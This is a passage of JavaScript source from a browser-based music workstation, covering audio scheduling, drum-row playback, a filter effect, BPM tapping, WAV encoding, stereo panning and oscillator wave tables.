	1174.66,
	1244.51,
	1318.51,
	1396.91,
	1479.98,
	1567.98,
	1661.22,
	1760,
	1864.66,
	1975.53,

	2093, // [84] -> C7
	2217.46,
	2349.32,
	2489.02,
	2637.02,
	2793.83,
	2959.96,
	3135.96,
	3322.44,
	3520,
	3729.31,
	3951.07,

	4186.01, // [96] -> C8
);

Object.freeze( gswaSynth.midiKeyToHz );

class gswaKeysScheduler {
	constructor( ctx ) {
		this.scheduler = new gswaScheduler();
		this._synth = null;
		this._startedKeys = new Map();
		Object.seal( this );

		this.scheduler.currentTime = () => ctx.currentTime;
		this.scheduler.ondatastart = this._onstartKey.bind( this );
		this.scheduler.ondatastop = this._onstopKey.bind( this );
		this.scheduler.enableStreaming( !( ctx instanceof OfflineAudioContext ) );
	}

	setSynth( synth ) {
		this._synth = synth;
	}
	change( obj ) {
		this.scheduler.change( obj );
	}
	start( when, off, dur ) {
		this.scheduler.start( when, off, dur );
	}
	stop() {
		this.scheduler.stop();
	}

	_onstartKey( startedId, blcs, when, off, dur ) {
		this._startedKeys.set( startedId,
			this._synth.startKey( blcs, when, off, dur ) );
	}
	_onstopKey( startedId ) {
		this._synth.stopKey( this._startedKeys.get( startedId ) );
		this._startedKeys.delete( startedId );
	}
}

class gswaDrumsScheduler {
	constructor( ctx ) {
		const sch = new gswaScheduler();

		this.scheduler = sch;
		this._drumrows = null;
		this._startedDrums = new Map();
		Object.seal( this );

		sch.currentTime = () => ctx.currentTime;
		sch.ondatastart = this._onstartDrum.bind( this );
		sch.ondatastop = this._onstopDrum.bind( this );
		sch.ondatapropchange = this._onchangeDrum.bind( this );
		sch.enableStreaming( !( ctx instanceof OfflineAudioContext ) );
	}

	setDrumrows( drumrows ) {
		this._drumrows = drumrows;
	}
	change( obj ) {
		const cpy = GSUtils.deepCopy( obj );

		Object.values( cpy ).forEach( drum => {
			if ( drum && "when" in drum ) { // 1.
				drum.duration = this._drumrows.getPatternDurationByRowId( drum.row );
			}
		} );
		this.scheduler.change( cpy );
	}
	start( when, off, dur ) {
		this.scheduler.start( when, off, dur );
	}
	stop() {
		this.scheduler.stop();
	}

	_onstartDrum( startedId, [ [ , drum ] ], when, off, _dur ) {
		if ( "gain" in drum ) {
			this._startedDrums.set( startedId,
				this._drumrows.startDrum( drum, when, off, drum.duration ) );
		} else {
			this._drumrows.startDrumcut( drum, when );
		}
	}
	_onstopDrum( startedId ) {
		this._drumrows.stopDrum( this._startedDrums.get( startedId ) );
		this._startedDrums.delete( startedId );
	}
	_onchangeDrum( startedId, prop, val ) {
		this._drumrows.changeDrumProp( startedId, prop, val );
	}
}

/*
1. The `if` check if the `drum` is new and not updating.
*/

const gswaBPMTap = {
	_stack: [],
	_timeBefore: 0,
	_stackLimit: 10,

	reset() {
		this._timeBefore =
		this._stack.length = 0;
	},
	tap() {
		const time = Date.now(),
			timeBefore = this._timeBefore;

		this._timeBefore = time;
		if ( timeBefore ) {
			const bpm = 60000 / ( time - timeBefore ),
				stack = this._stack,
				lastBpm = stack.length
					? stack[ stack.length - 1 ]
					: 0;

			if ( lastBpm && ( bpm < lastBpm / 1.5 || bpm > lastBpm * 1.5 ) ) {
				stack.length = 0;
			} else {
				if ( stack.unshift( bpm ) > this._stackLimit ) {
					stack.length = this._stackLimit;
				}
				return stack.reduce( ( sum, bpm ) => sum + bpm, 0 ) / stack.length;
			}
		}
		return 0;
	},
};

class gswaEffects {
	constructor( fns ) {
		this.ctx = null;
		this._getChanInput = fns.getChanInput;
		this._getChanOutput = fns.getChanOutput;
		this._wafxs = new Map();
		this.gsdata = new DAWCore.controllers.effects( {
			dataCallbacks: {
				changeBPM: bpm => this._wafxs.forEach( fx => fx.setBPM && fx.setBPM( bpm ) ),
				addEffect: this._addEffect.bind( this ),
				removeEffect: this._removeEffect.bind( this ),
				changeEffect: this._changeEffect.bind( this ),
				connectEffectTo: this._connectEffectTo.bind( this ),
				changeEffectData: ( id, data ) => this._wafxs.get( id ).change( data ),
			},
		} );
		Object.seal( this );
	}

	// .........................................................................
	setContext( ctx ) {
		this.ctx = ctx;
		this.gsdata.reset();
	}
	change( obj ) {
		this.gsdata.change( obj );
	}
	clear() {
		this.gsdata.clear();
	}
	liveChangeFxProp( id, prop, val ) {
		this._wafxs.get( id ).liveChange( prop, val );
	}

	// .........................................................................
	_addEffect( id, fx ) {
		const wafx = new ( gswaEffects.fxsMap.get( fx.type ) )();

		this._wafxs.set( id, wafx );
		wafx.setContext( this.ctx );
	}
	_removeEffect( id ) {
		const wafx = this._wafxs.get( id );

		wafx.output.disconnect();
		this._wafxs.delete( id );
	}
	_changeEffect( id, prop, val ) {
		if ( prop === "toggle" ) {
			this._wafxs.get( id ).toggle( val );
		}
	}
	_connectEffectTo( chanId, fxId, nextFxId ) {
		const dest = nextFxId
				? this._wafxs.get( nextFxId ).input
				: this._getChanOutput( chanId ),
			node = fxId
				? this._wafxs.get( fxId ).output
				: this._getChanInput( chanId );

		if ( node ) {
			node.disconnect();
			node.connect( dest );
		}
	}
}

gswaEffects.fxsMap = new Map();
Object.freeze( gswaEffects );

class gswaFxFilter {
	constructor() {
		this.ctx =
		this.input =
		this.output =
		this._filter =
		this.responseHzIn =
		this.responseMagOut =
		this.responsePhaseOut = null;
		this._respSize = -1;
		this._enable = false;
		this._ctrl = new DAWCore.controllersFx.filter( {
			dataCallbacks: {
				type: this._changeType.bind( this ),
				Q: this._changeProp.bind( this, "Q" ),
				gain: this._changeProp.bind( this, "gain" ),
				detune: this._changeProp.bind( this, "detune" ),
				frequency: this._changeProp.bind( this, "frequency" ),
			},
		} );
		Object.seal( this );
	}

	// .........................................................................
	setContext( ctx ) {
		if ( this.ctx ) {
			this.input.disconnect();
			this.output.disconnect();
			this._filter.disconnect();
		}
		this.ctx = ctx;
		this.input = ctx.createGain();
		this.output = ctx.createGain();
		this._filter = ctx.createBiquadFilter();
		this._ctrl.recall();
		this.toggle( this._enable );
	}
	toggle( b ) {
		this._enable = b;
		if ( this.ctx ) {
			if ( b ) {
				this.input.disconnect();
				this.input.connect( this._filter );
				this._filter.connect( this.output );
			} else {
				this._filter.disconnect();
				this.input.connect( this.output );
			}
		}
	}
	change( obj ) {
		this._ctrl.change( obj );
	}
	liveChange( prop, val ) {
		this._changeProp( prop, val );
	}
	clear() {
		this._ctrl.clear();
		this._respSize = -1;
		this.responseHzIn =
		this.responseMagOut =
		this.responsePhaseOut = null;
	}
	updateResponse( size ) {
		this._createResponseArrays( size );
		this._filter.getFrequencyResponse(
			this.responseHzIn,
			this.responseMagOut,
			this.responsePhaseOut );
		return this.responseMagOut;
	}

	// .........................................................................
	_changeType( type ) {
		this._filter.type = type;
	}
	_changeProp( prop, val ) {
		this._filter[ prop ].setValueAtTime( val, this.ctx.currentTime );
	}
	_createResponseArrays( w ) {
		if ( w !== this._respSize ) {
			const nyquist = this.ctx.sampleRate / 2,
				Hz = new Float32Array( w );

			this._respSize = w;
			this.responseHzIn = Hz;
			this.responseMagOut = new Float32Array( w );
			this.responsePhaseOut = new Float32Array( w );
			for ( let i = 0; i < w; ++i ) {
				Hz[ i ] = nyquist * ( 2 ** ( i / w * 11 - 11 ) );
			}
		}
	}
}

Object.freeze( gswaFxFilter );

if ( typeof gswaEffects !== "undefined" ) {
	gswaEffects.fxsMap.set( "filter", gswaFxFilter );
}

class gswaDrumrows {
	constructor() {
		const ctrl = new DAWCore.controllers.drumrows( {
				dataCallbacks: {
					addDrumrow: GSUtils.noop,
					removeDrumrow: this._removeDrumrow.bind( this ),
					changeDrumrow: this._changeDrumrow.bind( this ),
				},
			} );

		this.ctx =
		this.onstartdrum =
		this.onstartdrumcut = null;
		this.getAudioBuffer =
		this.getChannelInput = GSUtils.noop;
		this._startedDrums = new Map();
		this._bps = 1;
		this._ctrl = ctrl;
		Object.seal( this );
	}

	// .........................................................................
	setContext( ctx ) {
		this.stopAllDrums();
		this.ctx = ctx;
	}
	setBPM( bpm ) {
		this._bps = bpm / 60;
	}
	change( obj ) {
		this._ctrl.change( obj );
	}
	clear() {
		this._ctrl.clear();
	}
	getPatternDurationByRowId( rowId ) {
		const d = this._ctrl.data;

		return d.patterns[ d.drumrows[ rowId ].pattern ].duration;
	}

	// start/stop
	// .........................................................................
	startLiveDrum( rowId ) {
		const drum = {
				row: rowId,
				detune: 0,
				gain: 1,
				pan: 0,
			};

		return this._startDrum( drum, this.ctx.currentTime, 0, null, true );
	}
	stopLiveDrum( rowId ) {
		this._startedDrums.forEach( ( nodes, id ) => {
			// if ( nodes.live && nodes.rowId === rowId ) {
			if ( nodes.rowId === rowId ) {
				this.stopDrum( id, "-f" );
			}
		} );
	}
	startDrumcut( drumcut, when ) {
		const cutDur = .001,
			whenCutStart = when - cutDur;

		this._startedDrums.forEach( ( nodes, id ) => {
			if ( nodes.absn && nodes.rowId === drumcut.row && nodes.when < whenCutStart && when < nodes.endAt ) {
				nodes.endAt = when;
				nodes.gainCut.gain.setValueCurveAtTime( new Float32Array( [ 1, 0 ] ), whenCutStart, cutDur );
				nodes.absn.stop( when + cutDur );
				if ( this.onstartdrumcut ) {
					const fn = this.onstartdrumcut.bind( null, nodes.rowId ),
						time = whenCutStart - this.ctx.currentTime;

					nodes.startDrumcutTimeoutId = setTimeout( fn, time * 1000 );
				}
			}
		} );
	}
	startDrum( drum, when, off, dur ) {
		return this._startDrum( drum, when, off, dur, false );
	}
	_startDrum( drum, when, off, durUser, live ) {
		const data = this._ctrl.data,
			rowId = drum.row,
			row = data.drumrows[ rowId ],
			pat = data.patterns[ row.pattern ],
			buffer = this.getAudioBuffer( pat.buffer ),
			dur = durUser !== null ? durUser : buffer ? buffer.duration : 0,
			id = ++gswaDrumrows._startedMaxId.value,
			nodes = {
				rowId, live, when, dur,
				endAt: when + dur,
				pan: drum.pan,
				gain: drum.gain,
				detune: drum.detune,
			};

		if ( buffer ) {
			const absn = this.ctx.createBufferSource(),
				gainRow = this.ctx.createGain(),
				gainCut = this.ctx.createGain(),
				panRow = this.ctx.createStereoPanner(),
				dest = this.getChannelInput( pat.dest );

			nodes.absn = absn;
			nodes.gainCut = gainCut;
			nodes.gainRow = gainRow;
			nodes.panRow = panRow;
			absn.buffer = buffer;
			absn.detune.setValueAtTime( ( row.detune + drum.detune ) * 100, this.ctx.currentTime );
			gainRow.gain.setValueAtTime( row.toggle ? row.gain * drum.gain : 0, this.ctx.currentTime );
			panRow.pan.setValueAtTime( GSUtils.panningMerge( row.pan, drum.pan ), this.ctx.currentTime );
			absn.connect( gainCut ).connect( gainRow ).connect( panRow ).connect( dest );
			absn.start( when, off, dur );
			if ( this.onstartdrum ) {
				const timeoutMs = ( when - this.ctx.currentTime ) * 1000;

				nodes.startDrumTimeoutId = setTimeout( () => this.onstartdrum( rowId ), timeoutMs );
			}
		}
		this._startedDrums.set( id, nodes );
		this._startedDrums.forEach( ( nodes, id ) => {
			if ( nodes.when + nodes.dur <= this.ctx.currentTime ) {
				this._stopDrum( id, nodes );
			}
		} );
		return id;
	}
	stopAllDrums() {
		this._startedDrums.forEach( ( _nodes, id ) => this.stopDrum( id, "-f" ) );
	}
	stopDrum( id, force ) {
		const nodes = this._startedDrums.get( id );

		if ( nodes && ( force === "-f" ||
			nodes.when + nodes.dur <= this.ctx.currentTime ||
			nodes.when >= this.ctx.currentTime
		) ) {
			this._stopDrum( id, nodes );
		}
	}
	_stopDrum( id, nodes ) {
		this._startedDrums.delete( id );
		clearTimeout( nodes.startDrumTimeoutId );
		clearTimeout( nodes.startDrumcutTimeoutId );
		if ( nodes.absn ) {
			nodes.absn.stop();
			nodes.gainCut.disconnect();
			nodes.gainRow.disconnect();
			nodes.panRow.disconnect();
			if ( this.onstopdrum ) {
				this.onstopdrum( nodes.rowId, id );
			}
		}
	}
	changeDrumProp( id, prop, val ) {
		const nodes = this._startedDrums.get( +id );

		if ( nodes ) {
			const row = this._ctrl.data.drumrows[ nodes.rowId ];

			switch ( prop ) {
				case "detune":
					nodes.detune = val;
					nodes.absn.detune.setValueAtTime( ( val + row.detune ) * 100, this.ctx.currentTime );
					break;
				case "gain":
					nodes.gain = val;
					nodes.gainRow.gain.setValueAtTime( row.toggle ? val * row.gain : 0, this.ctx.currentTime );
					break;
				case "pan": {
					nodes.pan = val;
					nodes.panRow.pan.setValueAtTime( GSUtils.panningMerge( val, row.pan ), this.ctx.currentTime );
				} break;
			}
		}
	}

	// add/remove/update
	// .........................................................................
	_removeDrumrow( id ) {
		this._startedDrums.forEach( ( nodes, startedId ) => {
			if ( nodes.rowId === id ) {
				this.stopDrum( startedId, "-f" );
			}
		} );
	}
	_changeDrumrow( id, prop, val ) {
		const row = this._ctrl.data.drumrows[ id ];

		switch ( prop ) {
			case "toggle":
				this.__changeDrumrow( id, nodes => {
					nodes.gainRow.gain.setValueAtTime( val ? row.gain : 0, this.ctx.currentTime );
				} );
				break;
			case "dest":
				this.__changeDrumrow( id, nodes => {
					nodes.gainRow.disconnect();
					nodes.gainRow.connect( this.getChannelInput( val ) );
				} );
				break;
			case "detune":
				this.__changeDrumrow( id, nodes => {
					nodes.absn.detune.setValueAtTime( ( val + nodes.detune ) * 100, this.ctx.currentTime );
				} );
				break;
			case "gain":
				this.__changeDrumrow( id, nodes => {
					nodes.gainRow.gain.setValueAtTime( val * nodes.gain, this.ctx.currentTime );
				} );
				break;
			case "pan":
				this.__changeDrumrow( id, nodes => {
					nodes.panRow.pan.setValueAtTime( GSUtils.panningMerge( val, nodes.pan ), this.ctx.currentTime );
				} );
				break;
		}
	}
	__changeDrumrow( rowId, fn ) {
		this._startedDrums.forEach( nodes => {
			if ( nodes.rowId === rowId && nodes.absn ) {
				fn( nodes );
			}
		} );
	}
}

gswaDrumrows._startedMaxId = Object.seal( { value: 0 } );

Object.freeze( gswaDrumrows );

class gswaScheduler {
	constructor() {
		this.ondatastart =
		this.ondatastop =
		this.ondatapropchange =
		this.onended =
		this.currentTime = () => {};
		this.bpm = 60;
		this.bps = 1;
		this.started = false;
		this.duration =
		this._startDur =
		this._startOff =
		this._startWhen =
		this._startFixedDur = 0;
		this._timeoutIdEnded = null;
		this.data = {};
		this._sortedData = [];
		this._dataScheduled = {};
		this._dataScheduledPerBlock = {};
		this._lastBlockId = null;
		this.loopA =
		this.loopB = null;
		this.looping = false;
		this.loopDuration = 0;
		this.isStreaming = true;
		this._streamloop = this._streamloop.bind( this );
		this._streamloopId = null;
		this._crud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._dataAddBlock.bind( this ),
			this._dataUpdateBlock.bind( this ),
			this._dataDeleteBlock.bind( this ) );
		Object.seal( this );
	}

	// BPM
	// .........................................................................
	setBPM( bpm ) {
		if ( this.bpm !== bpm ) {
			const ratio = this.bpm / bpm,
				currTime = this.getCurrentOffset() * ratio;

			this.bpm = bpm;
			this.bps = bpm / 60;
			this.duration *= ratio;
			if ( this.looping ) {
				this.loopA *= ratio;
				this.loopB *= ratio;
				this.loopDuration = this.loopB - this.loopA;
				this.setCurrentOffset( this.loopB > currTime ? currTime : this.loopA );
			} else {
				this.setCurrentOffset( currTime );
			}
		}
	}

	// Empty
	// .........................................................................
	empty() {
		this._sortedData.forEach( kv => this._dataDeleteBlock( kv[ 0 ] ) );
		this.clearLoop();
	}

	// Loop
	// .........................................................................
	setLoopBeat( a, b ) {
		return this.setLoop( a / this.bps, b / this.bps );
	}
	setLoop( a, b ) {
		const off = this.started && this.getCurrentOffset();

		this.looping = true;
		this.loopA = Math.min( a, b );
		this.loopB = Math.max( a, b );
		this.loopDuration = this.loopB - this.loopA;
		if ( this.started ) {
			this.setCurrentOffset( this.loopB > off ? off : this.loopA );
		}
	}
	clearLoop() {
		if ( this.looping ) {
			const off = this.getCurrentOffset();

			this.looping = false;
			this.setCurrentOffset( off );
		}
	}

	// set/getCurrentOffset
	// .........................................................................
	setCurrentOffsetBeat( off ) {
		this.setCurrentOffset( off / this.bps );
	}
	setCurrentOffset( off ) {
		this._startOff = off;
		this.started && this.start( 0, off );
	}
	getCurrentOffsetBeat() {
		return this.getCurrentOffset() * this.bps;
	}
	getCurrentOffset() {
		return this.started
			? this.getFutureOffsetAt( this.currentTime() )
			: this._startOff;
	}
	getFutureOffsetAt( futureTime ) {
		let t = this._startOff + futureTime - this._startWhen;

		if ( this.looping && t > this.loopB - .001 ) {
			t = this.loopA + ( t - this.loopA ) % this.loopDuration;
			if ( t > this.loopB - .001 ) {
				t = this.loopA;
			}
		}
		return t;
	}

	// Start / stop
	// .........................................................................
	enableStreaming( b = true ) {
		this.isStreaming = b;
	}
	startBeat( when, off = 0, dur ) {
		return this.start( when, off / this.bps,
			Number.isFinite( dur )
				? dur / this.bps
				: dur );
	}
	start( when, off = 0, dur ) {
		const currTime = this.currentTime();

		if ( this.started ) {
			this.stop();
		}
		this.started = true;
		this._startFixedDur = Number.isFinite( dur );
		this._startWhen = Math.max( currTime, when );
		this._startOff = off;
		this._startDur = this._startFixedDur
			? dur
			: this.duration - off;
		if ( this.isStreaming && !this.looping ) {
			this._timeoutIdEnded = setTimeout(
				this.onended.bind( this ),
				this._startDur * 1000 );
		}
		this.isStreaming
			? this._streamloopOn()
			: this._fullStart();
	}
	stop() {
		if ( this.started ) {
			this._startOff = this.getCurrentOffset();
			this.started = false;
			clearTimeout( this._timeoutIdEnded );
			this._streamloopOff();
			Object.keys( this._dataScheduledPerBlock ).forEach( this._blockStop, this );
		}
	}
	_getOffsetEnd() {
		return this.looping ? this.loopB : this._startOff + this._startDur;
	}
	_updateDuration( dur ) {
		if ( dur !== this.duration ) {
			this.duration = dur;
			if ( this.started && !this._startFixedDur ) {
				this._startDur = dur;
			}
			if ( this.looping || !this._startFixedDur ) {
				clearTimeout( this._timeoutIdEnded );
			}
			if ( this.started && this.isStreaming && !this.looping ) {
				this._timeoutIdEnded = setTimeout( this.onended.bind( this ),
					( dur - this._startOff - this.currentTime() + this._startWhen ) * 1000 );
			}
		}
	}

	// Full start
	// .........................................................................
	_fullStart() {
		const when = this._startWhen,
			from = this._startOff,
			to = from + this._startDur;

		this._sortedData.forEach( kv => this._blockStart( when, from, to, to, ...kv ) );
	}

	// Stream loop
	// .........................................................................
	_streamloopOn() {
		if ( !this._streamloopId ) {
			this._streamloopId = setInterval( this._streamloop, 100 );
			this._streamloop();
		}
	}
	_streamloopOff() {
		if ( this._streamloopId ) {
			clearInterval( this._streamloopId );
			this._streamloopId = null;
		}
	}
	_streamloop() {
		const currTime = this.currentTime();
		let stillSomethingToPlay;

		Object.entries( this._dataScheduled ).forEach( ( [ id, obj ] ) => {
			if ( obj.whenEnd < currTime ) {
				delete this._dataScheduled[ id ];
				delete this._dataScheduledPerBlock[ obj.blockId ].started[ id ];
				this.ondatastop( id );
			}
		} );
		this._sortedData.forEach( kv => {
			if ( this._blockSchedule( kv[ 0 ] ) ) {
				stillSomethingToPlay = true;
			}
		} );
		if ( !this.looping && !stillSomethingToPlay ) {
			this._streamloopOff();
		}
	}

	// Block functions
	// .........................................................................
	_blockStop( id ) {
		const dataScheduled = this._dataScheduled,
			blcSchedule = this._dataScheduledPerBlock[ id ];

		Object.keys( blcSchedule.started ).forEach( id => {
			this.ondatastop( id );
			delete dataScheduled[ id ];
			delete blcSchedule.started[ id ];
		} );
		blcSchedule.scheduledUntil = 0;
	}
	_blockSchedule( id ) {
		if ( this.started ) {
			const currTime = this.currentTime(),
				currTimeEnd = currTime + 1,
				blcSchedule = this._dataScheduledPerBlock[ id ];
			let until = Math.max( currTime, blcSchedule.scheduledUntil || 0 );

			if ( until < currTimeEnd ) {
				const offEnd = this._getOffsetEnd(),
					blc = this.data[ id ];

				do {
					const from = this.getFutureOffsetAt( until ),
						to = Math.min( from + 1, offEnd );

					until += this._blockStart( until, from, to, offEnd, id, blc );
				} while ( this.looping && until < currTimeEnd );
				blcSchedule.scheduledUntil = until;
			}
			return blcSchedule.scheduledUntil <= this._startWhen + this._startDur;
		}
	}
	_blockStart( when, from, to, offEnd, blockId, block ) {
		if ( block.prev == null ) {
			const bps = this.bps,
				blcs = [];
			let bWhn = block.when / bps,
				bOff = block.offset / bps,
				bDur = 0;

			for ( let id = blockId, blc = block; blc; ) {
				blcs.push( [ id, blc ] );
				bDur = blc.when / bps - bWhn + blc.duration / bps;
				id = blc.next;
				blc = id != null ? this.data[ id ] : null;
			}
			if ( from <= bWhn + bDur && bWhn < to ) {
				const startWhen = this._startWhen;

				if ( bWhn + bDur > offEnd ) {
					bDur -= bWhn + bDur - offEnd;
				}
				if ( bWhn < from ) {
					bOff += from - bWhn;
					bDur -= from - bWhn;
					bWhn = from;
				}
				bWhn = when + bWhn - from;
				if ( bWhn < startWhen ) {
					bOff += startWhen - bWhn;
					bDur -= startWhen - bWhn;
					bWhn = startWhen;
				}
				if ( bDur > .000001 ) {
					const id = `${ ++gswaScheduler._startedMaxId.value }`;

					this._dataScheduledPerBlock[ blockId ].started[ id ] =
					this._dataScheduled[ id ] = {
						block,
						blockId,
						when: bWhn,
						whenEnd: bWhn + bDur,
					};
					this.ondatastart( id, blcs, bWhn, bOff, bDur );
				}
				return offEnd - from;
			}
		}
		return to - from;
	}
	_isLastBlock( id ) {
		if ( this._lastBlockId === id ) {
			this._findLastBlock();
		} else {
			const blc = this.data[ id ],
				whnEnd = ( blc.when + blc.duration ) / this.bps;

			if ( whnEnd > this.duration ) {
				this._lastBlockId = id;
				this._updateDuration( whnEnd );
			}
		}
	}
	_findLastBlock() {
		this._updateDuration( Object.entries( this.data )
			.reduce( ( max, [ id, blc ] ) => {
				const whnEnd = ( blc.when + blc.duration ) / this.bps;

				if ( whnEnd > max ) {
					this._lastBlockId = id;
					return whnEnd;
				}
				return max;
			}, 0 ) );
	}

	// Data
	// .........................................................................
	change( obj ) {
		this._crud( obj );
		this._sortedData = Object.entries( this.data ).sort( ( a, b ) => a[ 1 ].when - b[ 1 ].when );
	}
	_dataDeleteBlock( id ) {
		if ( !( id in this.data ) ) {
			console.warn( "gswaScheduler: data delete unknown id", id );
		} else {
			delete this.data[ id ];
			if ( this.started ) {
				this._blockStop( id );
			}
			if ( this._lastBlockId === id ) {
				this._findLastBlock();
			}
			delete this._dataScheduledPerBlock[ id ];
		}
	}
	_dataAddBlock( id, obj ) {
		this._dataScheduledPerBlock[ id ] = {
			started: {},
			scheduledUntil: 0,
		};
		this.data[ id ] = {
			when: 0,
			offset: 0,
			duration: 0,
			...obj,
		};
		this._isLastBlock( id );
		this._blockSchedule( id );
	}
	_dataUpdateBlock( id, obj ) {
		Object.entries( obj ).forEach( kv => this._dataUpdateBlockProp( id, ...kv ) );
	}
	_dataUpdateBlockProp( id, prop, val ) {
		const propTime = prop === "when" || prop === "offset" || prop === "duration",
			propLink = prop === "prev" || prop === "next";

		if ( val === undefined ) {
			delete this.data[ id ][ prop ];
		} else {
			this.data[ id ][ prop ] = val;
		}
		if ( propTime ) {
			this._isLastBlock( id );
		}
		if ( this.started ) {
			if ( propTime || propLink ) {
				this._blockStop( id );
				this._blockSchedule( id );
			} else {
				Object.keys( this._dataScheduledPerBlock[ id ].started ).forEach( startedId => {
					this.ondatapropchange( startedId, prop, val );
				} );
			}
		}
	}
}

gswaScheduler._startedMaxId = Object.seal( { value: 0 } );

Object.freeze( gswaScheduler );

class gswaEncodeWAV {
	static encode( buffer, opt ) {
		const nbChannels = buffer.numberOfChannels,
			sampleRate = buffer.sampleRate,
			format = opt && opt.float32 ? 3 : 1,
			bitsPerSample = format === 3 ? 32 : 16,
			bytesPerSample = bitsPerSample / 8,
			bytesPerbloc = nbChannels * bytesPerSample,
			samples = nbChannels === 2
				? gswaEncodeWAV._interleave( buffer.getChannelData( 0 ), buffer.getChannelData( 1 ) )
				: buffer.getChannelData( 0 ),
			dataSize = samples.length * bytesPerSample,
			arrBuffer = new ArrayBuffer( 44 + dataSize ),
			data = new DataView( arrBuffer );

		gswaEncodeWAV._setString( data, 0, "RIFF" );           // FileTypeBlocID(4) : "RIFF"
		data.setUint32( 4, 36 + dataSize, true );              // FileSize(4)       : headerSize + dataSize - 8
		gswaEncodeWAV._setString( data, 8, "WAVE" );           // FileFormatID(4)   : "WAVE"
		gswaEncodeWAV._setString( data, 12, "fmt " );          // FormatBlocID(4)   : "fmt "
		data.setUint32( 16, 16, true );                        // BlocSize(4)       : 16
		data.setUint16( 20, format, true );                    // AudioFormat(2)    : Format du stockage dans le fichier (1: PCM, ...)
		data.setUint16( 22, nbChannels, true );                // nbChannels(2)     : 1, 2, ..., 6
		data.setUint32( 24, sampleRate, true );                // sampleRate(4)     : 11025, 22050, 44100
		data.setUint32( 28, sampleRate * bytesPerbloc, true ); // bytesPerSec(4)    : sampleRate * bytesPerbloc
		data.setUint16( 32, bytesPerbloc, true );              // bytesPerbloc(2)   : nbChannels * bitsPerSample / 8
		data.setUint16( 34, bitsPerSample, true );             // bitsPerSample(2)  : 8, 16, 24
		gswaEncodeWAV._setString( data, 36, "data" );          // DataBlocID(4)     : "data"
		data.setUint32( 40, dataSize, true );                  // dataSize(4)       : fileSize - 44

		( format === 1
			? gswaEncodeWAV._bufToInt16
			: gswaEncodeWAV._bufToFloat32
		)( data, 44, samples );
		return arrBuffer;
	}

	// private:
	static _interleave( ldata, rdata ) {
		const len = ldata.length + rdata.length,
			arr = new Float32Array( len );

		for ( let i = 0, j = 0; i < len; ++j ) {
			arr[ i++ ] = ldata[ j ];
			arr[ i++ ] = rdata[ j ];
		}
		return arr;
	}
	static _setString( data, offset, str ) {
		for ( let i = 0; i < str.length; ++i ) {
			data.setUint8( offset + i, str.charCodeAt( i ) );
		}
	}
	static _bufToInt16( data, offset, samples ) {
		for ( let i = 0; i < samples.length; ++i ) {
			const s = Math.max( -1, Math.min( samples[ i ], 1 ) );

			data.setInt16( offset + i * 2, s < 0 ? s * 0x8000 : s * 0x7FFF, true );
		}
	}
	static _bufToFloat32( data, offset, samples ) {
		for ( let i = 0; i < samples.length; ++i ) {
			data.setFloat32( offset + i * 4, samples[ i ], true );
		}
	}
}

class gswaStereoPanner {
	constructor( ctx ) {
		this._splitter = ctx.createChannelSplitter( 2 );
		this._left = ctx.createGain();
		this._right = ctx.createGain();
		this._merger = ctx.createChannelMerger( 2 );
		this._splitter.connect( this._left, 0 );
		this._splitter.connect( this._right, 1 );
		this._left.connect( this._merger, 0, 0 );
		this._right.connect( this._merger, 0, 1 );
	}

	connect( ...args ) {
		return this._merger.connect( ...args );
	}
	disconnect( ...args ) {
		return this._merger.disconnect( ...args );
	}
	getInput() {
		return this._splitter;
	}
	getValue() {
		return this._right.gain.value - this._left.gain.value;
	}
	setValueAtTime( value, when ) {
		this._left.gain.setValueAtTime( Math.min( 1 - value, 1 ), when );
		this._right.gain.setValueAtTime( Math.min( 1 + value, 1 ), when );
	}
}

const gswaPeriodicWaves = Object.freeze( {
	list: new Map(),
	_cache: new Map(),

	clearCache() {
		this._cache.clear();
	},
	get( ctx, name ) {
		let p = this._cache.get( name );

		if ( !p ) {
			const w = gswaPeriodicWaves.list.get( name );

			p = ctx.createPeriodicWave( w.real, w.imag );
			this._cache.set( name, p );
		}
		return p;
	},
} );

// Thanks to:
// https://github.com/lukehorvat/web-audio-oscillators
// (and https://github.com/mohayonao/wave-tables)

[
	// natives:
	[ "sine",     { imag: Array.from( { length: 2048 }, ( _, n ) => n === 1 ? 1 : 0 ) } ],
	[ "triangle", { imag: Array.from( { length: 2048 }, ( _, n ) => 8 * Math.sin( n * Math.PI / 2 ) / ( n * Math.PI ) ** 2 ) } ],
	[ "sawtooth", { imag: Array.from( { length: 2048 }, ( _, n ) => 2 / ( n * Math.PI ) * ( -1 ) ** ( n + 1 ) ) } ],
	[ "square",   { imag: Array.from( { length: 2048 }, ( _, n ) => 2 / ( n * Math.PI ) * ( 1 - ( -1 ) ** n ) ) } ],

	// customs simple:
	[ "bass",     { real: [ 0, .5154639175257731, 1, .8144329896907216, .20618556701030927, .020618556701030927 ] } ],
	[ "brass",    { real: [ 0, .4, 1, 1, 1, .3, .7, .6, .5, .9, .8 ] } ],
	[ "organ",    { imag: [ 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1 ] } ],
	[ "organ2",   { real: [ 0, .4, .8, .6, .6, .7, .6, 0, .8, .3, 1 ] } ],

	// customs complex:
	[ "chiptune",    { real: Array.from( { length: 2048 },  ( _, n ) => 4 / ( n * Math.PI ) * Math.sin( Math.PI * n * .18 ) ) } ],
	[ "organ3",      { real: [ 0, 0, -.042008, .010474, -.138038, .002641, -.001673, .001039, -.021054, .000651, -.000422, .000334, -.000236, .000191, -.000161, .000145, -.018478, .000071, -.000066, .000047, -.000044, .000041, -.000034, .000031, -.00003, .000028, -.000025, .000024, -.000022, .00002, -.000015, .000013, -.01157, .000004, -.000003, .000003, -.000003, .000003, -.000003, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000001, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000898, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000245, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 